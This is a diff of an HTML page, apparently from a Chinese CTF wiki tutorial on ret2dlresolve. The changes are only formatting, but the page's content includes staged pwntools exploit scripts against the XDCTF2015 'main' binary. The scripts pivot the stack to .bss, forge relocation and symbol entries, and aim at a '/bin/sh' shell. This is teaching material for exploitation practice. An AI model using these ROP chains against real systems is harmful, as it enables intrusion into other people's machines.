@@ -157,8 +157,8 @@
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#ret2vdso">ret2VDSO</a><ul>
 <li class="toctree-l4"><a class="reference internal" href="#vdso">VDSO介绍</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id14">原理</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id15">题目</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id13">原理</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id14">题目</a></li>
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#jop">JOP</a></li>
@@ -246,23 +246,21 @@
 <div class="section" id="id1">
 <h3>原理<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
 <p>要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程，请参考executable中elf对应的介绍。这里我只给出相应的利用方式。</p>
-<p>我们知道在linux中是利用 _dl_runtime_resolve(link_map_obj, reloc_index) 来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案还肯定的。具体利用方式如下</p>
-<ol class="arabic">
-<li><p class="first">控制程序执行dl_resolve函数</p>
-<blockquote>
-<div><ul class="simple">
+<p>我们知道在linux中是利用_dl_runtime_resolve(link_map_obj,
+reloc_index)来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案还肯定的。具体利用方式如下</p>
+<ol class="arabic simple">
+<li><dl class="first docutils">
+<dt>控制程序执行dl_resolve函数</dt>
+<dd><ul class="first last">
 <li>给定Link_map以及index两个参数。</li>
-<li>当然我们可以直接给定
-plt0对应的汇编代码，这时，我们就只需要一个index就足够了。</li>
+<li>当然我们可以直接给定 plt0对应的汇编代码，这时，我们就只需要一个index就足够了。</li>
 </ul>
-</div></blockquote>
+</dd>
+</dl>
 </li>
-<li><p class="first">控制index的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。</p>
-</li>
-<li><p class="first">伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。</p>
-</li>
-<li><p class="first">伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</p>
-</li>
+<li>控制index的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。</li>
+<li>伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。</li>
+<li>伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</li>
 </ol>
 <p><strong>此外，这个攻击成功的很必要的条件</strong></p>
 <ul class="simple">
@@ -271,11 +269,22 @@ plt0对应的汇编代码，这时，我们就只需要一个index就足够了�
 </ul>
 <p>注意：</p>
 <ul class="simple">
-<li>符号版本信息</li>
-<li>最好使得ndx = VERSYM[ (reloc-&gt;r_info) &gt;&gt; 8]
-的值为0，以便于防止找不到的情况。</li>
-<li>重定位表项</li>
+<li><dl class="first docutils">
+<dt>符号版本信息</dt>
+<dd><ul class="first last">
+<li>最好使得ndx = VERSYM[ (reloc-&gt;r_info) &gt;&gt; 8] 的值为0，以便于防止找不到的情况。</li>
+</ul>
+</dd>
+</dl>
+</li>
+<li><dl class="first docutils">
+<dt>重定位表项</dt>
+<dd><ul class="first last">
 <li>r_offset必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</li>
+</ul>
+</dd>
+</dl>
+</li>
 </ul>
 </div>
 <div class="section" id="id2">
@@ -298,8 +307,8 @@ plt0对应的汇编代码，这时，我们就只需要一个index就足够了�
 <li><p class="first">利用正常的代码来使用该技巧从而获取shell。</p>
 <blockquote>
 <div><p>stage 1 测试控制程序执行write函数的效果。</p>
-<p>stage 2 测试控制程序执行 dl_resolve 函数，并且相应参数指向正常write函数的plt时的执行效果。</p>
-<p>stage 3 测试控制程序执行 dl_resolve 函数，并且相应参数指向伪造的write函数的plt时的执行效果。</p>
+<p>stage 2 测试控制程序执行dl_resolve函数，并且相应参数指向正常write函数的plt时的执行效果。</p>
+<p>stage 3 测试控制程序执行dl_resolve函数，并且相应参数指向伪造的write函数的plt时的执行效果。</p>
 </div></blockquote>
 </li>
 <li><p class="first">利用roputils中已经集成好的工具来实现攻击，从而获取shell。</p>
@@ -308,7 +317,7 @@ plt0对应的汇编代码，这时，我们就只需要一个index就足够了�
 <div class="section" id="id4">
 <h4>正常攻击<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
 <p>显然我们程序有一个很明显的栈溢出漏洞的。这题我们不考虑我们有libc的情况。我们可以很容易的分析出偏移为112。</p>
-<div class="code shell highlight-default"><div class="highlight"><pre><span></span>gef➤  pattern create 200
+<div class="code asm highlight-default"><div class="highlight"><pre><span></span>gef➤  pattern create 200
 [+] Generating a pattern of 200 bytes
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
 [+] Saved as &#39;$_gef0&#39;
@@ -377,19 +386,19 @@ gef➤  pattern search 0x62616164
 
 <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 
-<span class="c1"># stack privot to bss segment</span>
-<span class="c1"># new stack size is 0x800</span>
+<span class="c1">## stack privot to bss segment</span>
+<span class="c1">## new stack size is 0x800</span>
 <span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
 <span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
-<span class="c1">## padding</span>
+<span class="c1">### padding</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
-<span class="c1">## read 100 byte to base_stage</span>
+<span class="c1">### read 100 byte to base_stage</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
-<span class="c1">## stack privot, set esp = base_stage</span>
+<span class="c1">### stack privot, set esp = base_stage</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
 
-<span class="c1"># write cmd=&quot;/bin/sh&quot;</span>
+<span class="c1">## write cmd=&quot;/bin/sh&quot;</span>
 <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
 <span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">sh</span><span class="p">))</span>
@@ -418,8 +427,7 @@ gef➤  pattern search 0x62616164
 </div>
 <div class="section" id="stage-2">
 <h5>stage 2<a class="headerlink" href="#stage-2" title="永久链接至标题">¶</a></h5>
-<p>在这一阶段，我们将会利用dlresolve相关的知识来控制程序执行write函数。这里我们主要是利用plt[0]中的相关指令，即push
-linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得单独提供一个write重定位项在plt表中的偏移。</p>
+<p>在这一阶段，我们将会利用dlresolve相关的知识来控制程序执行write函数。这里我们主要是利用plt[0]中的相关指令，即push linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得单独提供一个write重定位项在plt表中的偏移。</p>
 <div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;main&#39;</span><span class="p">)</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
@@ -430,19 +438,19 @@ linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得
 
 <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 
-<span class="c1"># stack privot to bss segment</span>
-<span class="c1"># new stack size is 0x800</span>
+<span class="c1">## stack privot to bss segment</span>
+<span class="c1">## new stack size is 0x800</span>
 <span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
 <span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
-<span class="c1">## padding</span>
+<span class="c1">### padding</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
-<span class="c1">## read 100 byte to base_stage</span>
+<span class="c1">### read 100 byte to base_stage</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
-<span class="c1">## stack privot, set esp = base_stage</span>
+<span class="c1">### stack privot, set esp = base_stage</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
 
-<span class="c1"># write cmd=&quot;/bin/sh&quot;</span>
+<span class="c1">## write cmd=&quot;/bin/sh&quot;</span>
 <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
 <span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>
 
@@ -451,7 +459,7 @@ linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得
 <span class="n">write_index</span> <span class="o">*=</span> <span class="mi">8</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">write_index</span><span class="p">)</span>
-<span class="c1"># fake ret addr of write</span>
+<span class="c1">## fake ret addr of write</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
@@ -511,32 +519,32 @@ linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得
 
 <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 
-<span class="c1"># stack privot to bss segment</span>
-<span class="c1"># new stack size is 0x800</span>
+<span class="c1">## stack privot to bss segment</span>
+<span class="c1">## new stack size is 0x800</span>
 <span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
 <span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
-<span class="c1">## padding</span>
+<span class="c1">### padding</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
-<span class="c1">## read 100 byte to base_stage</span>
+<span class="c1">### read 100 byte to base_stage</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
-<span class="c1">## stack privot, set esp = base_stage</span>
+<span class="c1">### stack privot, set esp = base_stage</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
 
-<span class="c1"># write sh=&quot;/bin/sh&quot;</span>
+<span class="c1">## write sh=&quot;/bin/sh&quot;</span>
 <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
 <span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>
 
 <span class="n">plt0</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.plt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
 <span class="n">rel_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.rel.plt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
-<span class="c1"># making base_stage+24 ---&gt; fake reloc</span>
+<span class="c1">## making base_stage+24 ---&gt; fake reloc</span>
 <span class="n">index_offset</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">-</span> <span class="n">rel_plt</span>
 <span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
 <span class="n">r_info</span> <span class="o">=</span> <span class="mh">0x607</span>
 
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
-<span class="c1"># fake ret addr of write</span>
+<span class="c1">## fake ret addr of write</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
@@ -568,7 +576,7 @@ linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得
 </div>
 <div class="section" id="stage-4">
 <h5>stage 4<a class="headerlink" href="#stage-4" title="永久链接至标题">¶</a></h5>
-<p>stage3中，我们控制了重定位表项，但是重定位表项的内容与write原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据write的重定位表项的 r_info=0x607 可以知道，write对应的符号在符号表的下标为 0x607&gt;&gt;8=0x6 。 因此，我们知道write对应的符号地址为0x8048238。</p>
+<p>stage3中，我们控制了重定位表项，但是重定位表项的内容与write原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据write的重定位表项的r_info=0x607可以知道，write对应的符号在符号表的下标为0x607&gt;&gt;8=0x6。因此，我们知道write对应的符号地址为0x8048238。</p>
 <div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  ret2dlresolve git:(master) ✗ objdump -s -EL -j  .dynsym main
 
 main：     文件格式 elf32-i386
@@ -597,19 +605,19 @@ Contents of section .dynsym:
 
 <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 
-<span class="c1"># stack privot to bss segment</span>
-<span class="c1"># new stack size is 0x800</span>
+<span class="c1">## stack privot to bss segment</span>
+<span class="c1">## new stack size is 0x800</span>
 <span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
 <span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
-<span class="c1">## padding</span>
+<span class="c1">### padding</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
-<span class="c1">## read 100 byte to base_stage</span>
+<span class="c1">### read 100 byte to base_stage</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
-<span class="c1">## stack privot, set esp = base_stage</span>
+<span class="c1">### stack privot, set esp = base_stage</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
 
-<span class="c1"># write sh=&quot;/bin/sh&quot;</span>
+<span class="c1">## write sh=&quot;/bin/sh&quot;</span>
 <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
 <span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>
 
@@ -618,7 +626,7 @@ Contents of section .dynsym:
 <span class="n">dynsym</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynsym&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
 <span class="n">dynstr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynstr&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
 
-<span class="c1">## making fake write symbol</span>
+<span class="c1">### making fake write symbol</span>
 <span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">32</span>
 <span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
                 <span class="p">)</span>  <span class="c1"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span>
@@ -627,9 +635,9 @@ Contents of section .dynsym:
     <span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10</span>  <span class="c1"># calculate the dynsym index of write</span>
 <span class="n">fake_write_sym</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="mh">0x4c</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">])</span>
 
-<span class="c1">## making fake write relocation</span>
+<span class="c1">### making fake write relocation</span>
 
-<span class="c1"># making base_stage+24 ---&gt; fake reloc</span>
+<span class="c1">## making base_stage+24 ---&gt; fake reloc</span>
 <span class="n">index_offset</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">-</span> <span class="n">rel_plt</span>
 <span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
 <span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
@@ -637,7 +645,7 @@ Contents of section .dynsym:
 
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
-<span class="c1"># fake ret addr of write</span>
+<span class="c1">## fake ret addr of write</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
@@ -681,19 +689,19 @@ Contents of section .dynsym:
 
 <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 
-<span class="c1"># stack privot to bss segment</span>
-<span class="c1"># new stack size is 0x800</span>
+<span class="c1">## stack privot to bss segment</span>
+<span class="c1">## new stack size is 0x800</span>
 <span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
 <span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
-<span class="c1">## padding</span>
+<span class="c1">### padding</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
-<span class="c1">## read 100 byte to base_stage</span>
+<span class="c1">### read 100 byte to base_stage</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
-<span class="c1">## stack privot, set esp = base_stage</span>
+<span class="c1">### stack privot, set esp = base_stage</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
 
-<span class="c1"># write sh=&quot;/bin/sh&quot;</span>
+<span class="c1">## write sh=&quot;/bin/sh&quot;</span>
 <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
 <span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>
 
@@ -702,20 +710,20 @@ Contents of section .dynsym:
 <span class="n">dynsym</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynsym&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
 <span class="n">dynstr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynstr&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
 
-<span class="c1">## making fake write symbol</span>
+<span class="c1">### making fake write symbol</span>
 <span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">32</span>
 <span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
                 <span class="p">)</span>  <span class="c1"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span>
 <span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="n">align</span>
 <span class="n">index_dynsym</span> <span class="o">=</span> <span class="p">(</span>
     <span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10</span>  <span class="c1"># calculate the dynsym index of write</span>
-<span class="c1"># plus 10 since the size of Elf32_Sym is 16.</span>
+<span class="c1">## plus 10 since the size of Elf32_Sym is 16.</span>
 <span class="n">st_name</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">dynstr</span>
 <span class="n">fake_write_sym</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">st_name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">])</span>
 
-<span class="c1">## making fake write relocation</span>
+<span class="c1">### making fake write relocation</span>
 
-<span class="c1"># making base_stage+24 ---&gt; fake reloc</span>
+<span class="c1">## making base_stage+24 ---&gt; fake reloc</span>
 <span class="n">index_offset</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">-</span> <span class="n">rel_plt</span>
 <span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
 <span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
@@ -723,7 +731,7 @@ Contents of section .dynsym:
 
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
-<span class="c1"># fake ret addr of write</span>
+<span class="c1">## fake ret addr of write</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
@@ -768,19 +776,19 @@ Contents of section .dynsym:
 
 <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 
-<span class="c1"># stack privot to bss segment</span>
-<span class="c1"># new stack size is 0x800</span>
+<span class="c1">## stack privot to bss segment</span>
+<span class="c1">## new stack size is 0x800</span>
 <span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
 <span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
-<span class="c1">## padding</span>
+<span class="c1">### padding</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
-<span class="c1">## read 100 byte to base_stage</span>
+<span class="c1">### read 100 byte to base_stage</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
-<span class="c1">## stack privot, set esp = base_stage</span>
+<span class="c1">### stack privot, set esp = base_stage</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
 
-<span class="c1"># write sh=&quot;/bin/sh&quot;</span>
+<span class="c1">## write sh=&quot;/bin/sh&quot;</span>
 <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
 <span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>
 
@@ -789,20 +797,20 @@ Contents of section .dynsym:
 <span class="n">dynsym</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynsym&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
 <span class="n">dynstr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynstr&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
 
-<span class="c1">## making fake write symbol</span>
+<span class="c1">### making fake write symbol</span>
 <span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">32</span>
